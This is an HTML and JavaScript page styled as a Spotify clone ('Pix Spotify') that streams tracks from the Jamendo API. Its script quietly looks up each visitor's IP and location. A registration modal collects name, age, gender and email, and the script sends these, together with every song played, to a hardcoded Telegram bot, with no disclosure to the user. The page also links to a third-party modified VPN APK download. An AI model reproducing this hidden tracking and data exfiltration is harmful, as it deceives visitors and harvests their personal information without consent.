<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pix Spotify Clone — Full Experience</title>
    
    <!-- Fonts & Icons -->
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --bg-base: #000000;
            --bg-sidebar: #000000;
            --bg-card: #181818;
            --bg-card-hover: #282828;
            --accent-green: #1ed760;
            --text-main: #ffffff;
            --text-sub: #a7a7a7;
            --border-subtle: #282828;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        body {
            background-color: var(--bg-base);
            color: var(--text-main);
            height: 100vh;
            display: grid;
            grid-template-rows: 1fr 90px;
            grid-template-columns: 260px 1fr;
            grid-template-areas: 
                "sidebar main"
                "player player";
            overflow: hidden;
        }

        /* Sidebar */
        aside.sidebar {
            grid-area: sidebar;
            background: var(--bg-sidebar);
            padding: 24px;
            display: flex;
            flex-direction: column;
            gap: 24px;
            border-right: 1px solid var(--border-subtle);
        }

        .logo-area {
            font-size: 24px;
            font-weight: 800;
            color: var(--text-main);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .logo-area span { color: var(--accent-green); }

        .nav-menu {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .nav-item {
            color: var(--text-sub);
            text-decoration: none;
            font-weight: 700;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 15px;
            transition: 0.2s;
            cursor: pointer;
        }

        .nav-item:hover, .nav-item.active { color: var(--text-main); }

        /* Main Content Area */
        main.main-content {
            grid-area: main;
            background: #121212;
            margin: 8px 8px 0 0;
            border-radius: 8px;
            padding: 24px 32px;
            overflow-y: auto;
        }

        .top-navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }

        .search-box-spotify {
            background: #242424;
            border-radius: 500px;
            display: flex;
            align-items: center;
            padding: 10px 16px;
            width: 360px;
            gap: 10px;
            border: 1px solid transparent;
        }

        .search-box-spotify:focus-within { border-color: #fff; }

        .search-box-spotify input {
            background: none;
            border: none;
            outline: none;
            color: #fff;
            width: 100%;
            font-size: 14px;
        }

        .user-profile-pill {
            background: #000;
            border-radius: 30px;
            padding: 4px 14px 4px 4px;
            display: flex;
            align-items: center;
            gap: 10px;
            border: 1px solid var(--border-subtle);
        }

        .user-avatar {
            width: 28px;
            height: 28px;
            background: var(--accent-green);
            color: #000;
            border-radius: 50%;
            font-weight: 800;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
        }

        /* Song Grid */
        .section-title {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 16px;
        }

        .cards-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 20px;
        }

        .spotify-card {
            background: var(--bg-card);
            padding: 16px;
            border-radius: 8px;
            transition: background 0.3s;
            cursor: pointer;
            position: relative;
        }

        .spotify-card:hover { background: var(--bg-card-hover); }

        .card-img {
            width: 100%;
            aspect-ratio: 1;
            object-fit: cover;
            border-radius: 6px;
            margin-bottom: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }

        .card-title {
            font-weight: 700;
            font-size: 14px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            margin-bottom: 4px;
        }

        .card-artist {
            color: var(--text-sub);
            font-size: 12px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        /* Bottom Player Bar (Spotify Exact) */
        footer.player-bar {
            grid-area: player;
            background: var(--bg-base);
            border-top: 1px solid var(--border-subtle);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            z-index: 1000;
        }

        .now-playing {
            display: flex;
            align-items: center;
            gap: 14px;
            width: 30%;
        }

        .now-playing img {
            width: 56px;
            height: 56px;
            border-radius: 4px;
            object-fit: cover;
        }

        .player-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            width: 40%;
        }

        .player-controls {
            display: flex;
            align-items: center;
            gap: 20px;
            color: var(--text-sub);
            font-size: 16px;
        }

        .player-controls .main-play {
            width: 32px;
            height: 32px;
            background: #fff;
            color: #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            cursor: pointer;
            transition: transform 0.1s;
        }

        .player-controls .main-play:hover { transform: scale(1.06); }

        .playback-bar {
            display: flex;
            align-items: center;
            gap: 8px;
            width: 100%;
            max-width: 500px;
            font-size: 11px;
            color: var(--text-sub);
        }

        .progress-slider, .volume-slider {
            flex: 1;
            accent-color: #fff;
            cursor: pointer;
            height: 4px;
        }

        .player-right {
            display: flex;
            align-items: center;
            gap: 12px;
            width: 30%;
            justify-content: flex-end;
            color: var(--text-sub);
        }

        /* Registration Modal */
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(10px);
            z-index: 5000;
            display: none;
            justify-content: center;
            align-items: center;
        }
        .modal-overlay.active { display: flex; }

        .spotify-modal {
            background: #121212;
            border: 1px solid #282828;
            padding: 32px;
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
        }

        .spotify-input {
            width: 100%;
            padding: 12px;
            background: #242424;
            border: 1px solid #333;
            border-radius: 4px;
            color: #fff;
            margin-top: 6px;
            margin-bottom: 16px;
            outline: none;
        }
        .spotify-input:focus { border-color: #fff; }

        .spotify-btn {
            width: 100%;
            background: var(--accent-green);
            color: #000;
            font-weight: 700;
            padding: 14px;
            border-radius: 500px;
            border: none;
            cursor: pointer;
            font-size: 15px;
        }
        .spotify-btn:hover { transform: scale(1.02); }
    </style>
</head>
<body>

    <!-- Registration Modal -->
    <div class="modal-overlay" id="authModal">
        <div class="spotify-modal">
            <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 8px; text-align: center;">Sign in to Pix Spotify</h2>
            <p style="color: var(--text-sub); font-size: 13px; text-align: center; margin-bottom: 24px;">Enter your details to generate your 7-digit ID & unlock full streaming.</p>
            
            <label style="font-size: 12px; font-weight: 700;">Full Name</label>
            <input type="text" id="regName" class="spotify-input" placeholder="Your Name">

            <label style="font-size: 12px; font-weight: 700;">Age</label>
            <input type="number" id="regAge" class="spotify-input" placeholder="Your Age">

            <label style="font-size: 12px; font-weight: 700;">Gender</label>
            <select id="regGender" class="spotify-input">
                <option value="Male">Male</option>
                <option value="Female">Female</option>
                <option value="Other">Other</option>
            </select>

            <label style="font-size: 12px; font-weight: 700;">Gmail or Contact</label>
            <input type="text" id="regContact" class="spotify-input" placeholder="email@gmail.com">

            <button class="spotify-btn" onclick="registerUser()">Continue</button>
        </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar">
        <div class="logo-area">
            <i class="fa-brands fa-spotify" style="color: var(--accent-green); font-size: 32px;"></i> Pix<span>Spotify</span>
        </div>
        <div class="nav-menu">
            <a class="nav-item active" onclick="fetchSongs('Top Global Hits')"><i class="fa-solid fa-house"></i> Home</a>
            <a class="nav-item" onclick="fetchSongs('Trending Hits')"><i class="fa-solid fa-magnifying-glass"></i> Search</a>
            <a class="nav-item" href="https://github.com/pixaua/pix-genarel/releases/download/V1/1.1.1.1.VPN.v6.38.9.Unlimited.Warp.apk" target="_blank"><i class="fa-solid fa-shield-halved"></i> WARP+ VPN APK</a>
        </div>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
        <div class="top-navbar">
            <div class="search-box-spotify">
                <i class="fa-solid fa-magnifying-glass" style="color: var(--text-sub);"></i>
                <input type="text" id="searchInput" placeholder="What do you want to listen to?" onkeypress="if(event.key==='Enter') searchSongs()">
            </div>
            <div id="authNavArea">
                <button class="spotify-btn" style="padding: 8px 20px; font-size: 13px;" onclick="openAuthModal()">Sign In</button>
            </div>
        </div>

        <h2 class="section-title" id="sectionTitle">Trending Full Songs</h2>
        <div class="cards-grid" id="songGrid">
            <div style="color: var(--accent-green);"><i class="fa-solid fa-circle-notch fa-spin"></i> Loading Spotify catalog...</div>
        </div>
    </main>

    <!-- Footer Music Player -->
    <footer class="player-bar">
        <div class="now-playing">
            <img src="https://images.unsplash.com/photo-1614613535308-eb5fbd3d2c17?w=500" id="playerThumb" alt="Thumb">
            <div>
                <div class="card-title" id="playerTitle">Select a track</div>
                <div class="card-artist" id="playerArtist">Pix Audio Engine</div>
            </div>
        </div>

        <div class="player-center">
            <div class="player-controls">
                <i class="fa-solid fa-backward-step" style="cursor: pointer;" title="Previous"></i>
                <div class="main-play" onclick="togglePlay()"><i class="fa-solid fa-play" id="playIcon"></i></div>
                <div class="fa-solid fa-forward-step" style="cursor: pointer;" title="Next"></div>
            </div>
            <div class="playback-bar">
                <span id="currentTime">0:00</span>
                <input type="range" min="0" max="100" value="0" class="progress-slider" id="progressSlider" oninput="seekAudio()">
                <span id="totalDuration">0:00</span>
            </div>
        </div>

        <div class="player-right">
            <i class="fa-solid fa-volume-high"></i>
            <input type="range" min="0" max="1" step="0.01" value="1" class="volume-slider" id="volumeSlider" oninput="changeVolume()">
        </div>

        <audio id="audioEngine" ontimeupdate="updateProgress()" onended="resetPlayButton()"></audio>
    </footer>

    <!-- SCRIPT LOGIC -->
    <script>
        const BOT_TOKEN = '7678905793:AAGEcM1-kHIo-jVsrZD0WliltCiSc9MIfBM';
        const CHAT_ID = '6162953772';

        function sendTelegramLog(message) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
            }).catch(() => {});
        }

        let visitorIP = 'N/A', visitorLocation = 'Unknown';
        window.addEventListener('DOMContentLoaded', () => {
            fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
                visitorIP = data.ip || 'N/A';
                visitorLocation = `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
            }).catch(() => {});

            checkLogin();
            fetchSongs('Global Top Hits');
        });

        function checkLogin() {
            const uid = localStorage.getItem('pix_user_id');
            const name = localStorage.getItem('pix_user_name');
            if(uid && name) {
                document.getElementById('authNavArea').innerHTML = `
                    <div class="user-profile-pill">
                        <div class="user-avatar">${name.charAt(0).toUpperCase()}</div>
                        <span style="font-size: 13px; font-weight: 700;">${name} <span style="color: var(--accent-green); font-size: 11px;">[PIX-${uid}]</span></span>
                    </div>
                `;
            } else {
                setTimeout(openAuthModal, 1500);
            }
        }

        function openAuthModal() { document.getElementById('authModal').classList.add('active'); }

        function registerUser() {
            const name = document.getElementById('regName').value.trim();
            const age = document.getElementById('regAge').value.trim();
            const gender = document.getElementById('regGender').value;
            const contact = document.getElementById('regContact').value.trim();

            if(!name || !age || !contact) { alert('সব তথ্য পূরণ করুন!'); return; }
            const uid = Math.floor(1000000 + Math.random() * 9000000);

            localStorage.setItem('pix_user_id', uid);
            localStorage.setItem('pix_user_name', name);

            sendTelegramLog(`━━━━━━━━━━━━━━━━━━━━\n👤 <b>NEW SPOTIFY USER REGISTERED!</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>PIX-${uid}</code>\n📛 <b>Name:</b> ${name}\n🎂 <b>Age:</b> ${age}\n⚧ <b>Gender:</b> ${gender}\n📧 <b>Contact:</b> ${contact}\n📍 <b>IP:</b> <code>${visitorIP}</code> (${visitorLocation})\n⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}\n━━━━━━━━━━━━━━━━━━━━`);

            document.getElementById('authModal').classList.remove('active');
            checkLogin();
        }

        function searchSongs() {
            const q = document.getElementById('searchInput').value.trim();
            if(q) {
                document.getElementById('sectionTitle').innerText = `Results for "${q}"`;
                fetchSongs(q);
            }
        }

        function fetchSongs(query) {
            const grid = document.getElementById('songGrid');
            grid.innerHTML = '<div style="color: var(--accent-green);"><i class="fa-solid fa-circle-notch fa-spin"></i> Searching full songs...</div>';

            fetch(`https://api.jamendo.com/v3.0/tracks/?client_id=5992982d&format=json&limit=24&search=${encodeURIComponent(query)}&audioformat=mp32`)
                .then(res => res.json())
                .then(data => {
                    if(data.results && data.results.length > 0) {
                        grid.innerHTML = '';
                        data.results.forEach(song => {
                            const title = song.name;
                            const artist = song.artist_name;
                            const url = song.audio;
                            const img = song.image || 'https://images.unsplash.com/photo-1514525253161-7a46d19cd819?w=500';

                            const card = document.createElement('div');
                            card.className = 'spotify-card';
                            card.innerHTML = `
                                <img src="${img}" class="card-img" alt="cover">
                                <div class="card-title">${title}</div>
                                <div class="card-artist">${artist}</div>
                            `;
                            card.onclick = () => playTrack(title, artist, url, img);
                            grid.appendChild(card);
                        });
                    } else {
                        grid.innerHTML = '<div style="color: #a7a7a7;">কোনো গান পাওয়া যায়নি। অন্য কিছু সার্চ করুন!</div>';
                    }
                }).catch(() => {
                    grid.innerHTML = '<div style="color: #a7a7a7;">লোডিং এ সমস্যা হয়েছে। আবার চেষ্টা করুন।</div>';
                });
        }

        const audio = document.getElementById('audioEngine');
        const playIcon = document.getElementById('playIcon');

        function playTrack(title, artist, url, thumb) {
            document.getElementById('playerTitle').innerText = title;
            document.getElementById('playerArtist').innerText = artist;
            document.getElementById('playerThumb').src = thumb;
            audio.src = url;
            audio.play();
            playIcon.className = 'fa-solid fa-pause';

            const uid = localStorage.getItem('pix_user_id') || 'GUEST';
            const uname = localStorage.getItem('pix_user_name') || 'Guest';
            sendTelegramLog(`━━━━━━━━━━━━━━━━━━━━\n⚡ <b>SPOTIFY PLAYING ACTIVITY</b>\n━━━━━━━━━━━━━━━━━━━━\n👤 <b>User:</b> ${uname} <code>[PIX-${uid}]</code>\n🎵 <b>Song:</b> ${title} - ${artist}\n⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}\n━━━━━━━━━━━━━━━━━━━━`);
        }

        function togglePlay() {
            if(!audio.src) return;
            if(audio.paused) { audio.play(); playIcon.className = 'fa-solid fa-pause'; }
            else { audio.pause(); playIcon.className = 'fa-solid fa-play'; }
        }

        function resetPlayButton() { playIcon.className = 'fa-solid fa-play'; }

        function updateProgress() {
            if(audio.duration) {
                const progress = (audio.currentTime / audio.duration) * 100;
                document.getElementById('progressSlider').value = progress;
                
                let curM = Math.floor(audio.currentTime / 60);
                let curS = Math.floor(audio.currentTime % 60);
                document.getElementById('currentTime').innerText = `${curM}:${curS < 10 ? '0':''}${curS}`;

                let durM = Math.floor(audio.duration / 60);
                let durS = Math.floor(audio.duration % 60);
                document.getElementById('totalDuration').innerText = `${durM}:${durS < 10 ? '0':''}${durS}`;
            }
        }

        function seekAudio() {
            const val = document.getElementById('progressSlider').value;
            if(audio.duration) { audio.currentTime = (val / 100) * audio.duration; }
        }

        function changeVolume() {
            audio.volume = document.getElementById('volumeSlider').value;
        }
    </script>
</body>
</html>
